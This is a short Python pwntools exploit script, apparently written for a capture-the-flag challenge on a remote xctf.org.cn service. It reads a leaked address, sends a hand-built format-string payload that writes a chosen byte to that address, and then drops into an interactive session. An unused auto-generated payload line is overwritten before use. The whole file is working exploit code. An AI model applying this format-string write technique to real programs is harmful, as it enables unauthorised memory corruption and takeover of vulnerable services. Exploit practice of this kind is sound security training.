from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
context.arch = 'amd64'
local = 0

if local:
	cn = process('./Taaa')
else:
	context.log_level = 'info'
	cn = remote('challenges.xctf.org.cn', 14001)

def z():
	gdb.attach(cn)
	raw_input()

cn.recvuntil('secret[1] is ')
data = cn.recvuntil('\n')
p = int(data,16)-4
success("p: "+hex(p))

pay = fmtstr_payload(10,{p:0x55},write_size='short')
pay = '%85c%12$hhnaaaaa'+p64(p)
cn.sendline(pay)
cn.recv()
#z()
cn.sendline('1')
cn.interactive()